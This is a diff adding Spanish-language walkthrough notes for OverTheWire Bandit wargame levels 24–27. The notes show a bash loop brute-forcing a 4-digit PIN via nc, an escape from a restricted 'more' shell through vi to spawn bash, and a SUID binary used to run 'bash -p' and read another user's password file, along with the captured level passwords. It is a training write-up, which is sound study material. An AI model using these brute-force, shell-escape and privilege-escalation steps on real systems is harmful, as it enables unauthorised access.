@@ -1906,30 +1906,190 @@ bandit23@bandit:/tmp/tmp.Z21GOahHr4$ cat jotapwned.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 
+## bandit24
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+```bash
+bandit24@bandit:~$ mktemp -d
+/tmp/tmp.7xDJrnCeaw
+bandit24@bandit:~$ cd /tmp/tmp.7xDJrnCeaw
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$
 
+# script
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ touch script.sh
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ chmod +x !$
+chmod +x script.sh
+
+
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ cat script.sh
+#!/bin/bash
+
+for i in {0000..9999}; do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$
+```
+Es diferente trabajar con la secuenta
+```bash
+#Es diferente trabajar con la secuenta
+$ for i in $(seq 0 100); do echo $i; done
+0
+1
+2
+3
+4
+5
+
+# y requerinos generar ping code 0000, para solucionar
+jjvargass@pc  ~  for i in {001..100}; do echo $i; done
+001
+002
+003
+004
+005
+006
+007
+008
+009
+```
+
+Ejecutamos scritp
 ```bash
 
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ ./script.sh
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0010
+
+# escrivimos ahora un diccionario
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ ./script.sh  > dictionary.txt
+
+# ejecutamos por el puerto
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ cat dictionary.txt | nc localhost 30002
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+para limpiar un ppoco la salida
+```bash
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ cat dictionary.txt | nc localhost 30002 | grep -v "Wrong"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+
+# tambien por please
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$ cat dictionary.txt | nc localhost 30002 | grep -v -E "Wrong|Please"
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/tmp.7xDJrnCeaw$
+```
+
+## bandit25
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+```bash
+bandit25@bandit:~$ ls
+bandit26.sshkey
+bandit25@bandit:~$
+
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+Connection to localhost closed.
+bandit25@bandit:~$
+
+# podriamos intentar con bash, pero no funciona
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost bash
+Could not create directory '/home/bandit25/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+whoami      
+```
+
+revisammos la terminal del usaurio
+```bash
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
 ```
 
 
-```bash
+# para aprobecharnos del more, debemos reducir el tamaño de la terminal
+#  v  => entras en modo   luego
+# :e  => para editar el archivo que queremos ver
 
+3  | |__   __ _ _ __   __| |_| |_   ) / /_
+~/text.txt[RO] [dec= 95] [hex=5F] [pos=0001:0003][16% of 6]                                                                                                               
+:e /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z   
+
+
+## bandit26
+```bash
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+Connection to bandit.labs.overthewire.org closed.
+
+# nuevamente debemos reducir el tamaño de la terminal y expaunear una shell
+# v                     => entras en modo   luego
+# :set shell=/bin/bash  => para definir una shell
+# :shell
+
+# obtenemos uns shell, escapando del contexto de more
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$
+
+# permisos suid
+bandit26@bandit:~$ ls -l
+total 12
+-rwsr-x--- 1 bandit27 bandit26 7296 May  7  2020 bandit27-do
+-rw-r----- 1 bandit26 bandit26  258 May  7  2020 text.txt
+
+
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$
+
+
+bandit26@bandit:~$ ./bandit27-do whoami
+bandit27
+bandit26@bandit:~$ ./bandit27-do bash -p
+bash-4.4$ whoami
+bandit27
+bash-4.4$
+
+bash-4.4$ cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
 ```
 
-
-```bash
-
-```
-
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
+## bandit28
